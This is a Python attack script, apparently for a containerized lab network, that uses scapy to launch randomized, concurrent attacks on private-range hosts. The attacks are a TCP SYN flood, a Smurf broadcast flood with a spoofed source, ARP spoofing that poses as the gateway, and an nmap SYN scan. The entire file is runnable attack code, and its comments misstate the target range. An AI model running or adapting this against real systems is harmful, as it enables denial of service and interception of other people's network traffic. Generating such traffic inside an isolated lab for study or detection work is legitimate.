import os
import random
import threading
import time
import scapy.all as scapy
from scapy.all import IP, ICMP, TCP, RandShort, send

# Target IPs and their corresponding MAC addresses
target_ips = [f"192.168.100.{i}" for i in range(11, 13)]  # IPs from .11 to .20


# Static MACs matching each IP (must align with container configs)
target_macs = {
    "192.168.100.11": "02:42:c0:a8:64:01",
    "192.168.100.12": "02:42:c0:a8:64:02",
    "192.168.100.13": "02:42:c0:a8:64:03"
}

def dos_attack(target_ip):
    print(f"Starting DoS attack on {target_ip}")
    packet = IP(dst=target_ip)/TCP(dport=80, sport=RandShort(), flags="S")
    send(packet, count=5000, verbose=False)
    print(f"DoS attack completed on {target_ip}")

def smurf_attack(target_ip):
    print(f"Starting Smurf attack on {target_ip}")
    broadcast_ip = "192.168.100.255"
    packet = IP(src=target_ip, dst=broadcast_ip)/ICMP()
    send(packet, count=5000, verbose=False)
    print(f"Smurf attack completed on {target_ip}")

def arp_spoof(target_ip):
    print(f"Starting ARP spoofing on {target_ip}")
    spoofed_ip = "192.168.100.1"  # Gateway IP
    mac = target_macs.get(target_ip)

    if mac:
        packet = scapy.Ether(dst=mac) / scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
        scapy.sendp(packet, count=100, verbose=False)
        print(f"ARP spoofing completed on {target_ip}")
    else:
        print(f"No static MAC address assigned for {target_ip}")

def nmap_scan(target_ip):
    print(f"Starting Nmap scan on {target_ip}")
    os.system(f"nmap -sS -p 20-100 {target_ip} -T4 --max-rtt-timeout 200ms")
    print(f"Nmap scan completed on {target_ip}")

def attack_client(target_ip):
    """Run random attacks against a specific client"""
    print(f"Launching attacks against {target_ip}")
    
    attacks = [
        lambda: dos_attack(target_ip),
        lambda: smurf_attack(target_ip),
        lambda: arp_spoof(target_ip),
        lambda: nmap_scan(target_ip)
    ]
    
    # Select a random number of attacks between 2 and 4
    num_attacks = random.randint(2, 4)
    
    # Select the random attacks
    selected_attacks = random.sample(attacks, num_attacks)
    
    attack_threads = []
    
    # Launch each selected attack in a separate thread
    for attack in selected_attacks:
        thread = threading.Thread(target=attack)
        attack_threads.append(thread)
        thread.start()
    
    # Wait for all attacks to complete
    for thread in attack_threads:
        thread.join()
    
    print(f"All attacks completed against {target_ip}")

def main():
    # Create a thread for each target IP
    client_threads = []
    
    for target_ip in target_ips:
        time.sleep(0.5)  # Slight delay to stagger attack start times
        thread = threading.Thread(target=attack_client, args=(target_ip,))
        client_threads.append(thread)
        thread.start()
        print(f"Started attack thread for {target_ip}")
    
    for thread in client_threads:
        thread.join()
    
    print("All attacks against all clients completed")

if __name__ == "__main__":
    print(f"Starting multi-client attack against {len(target_ips)} targets")
    main()
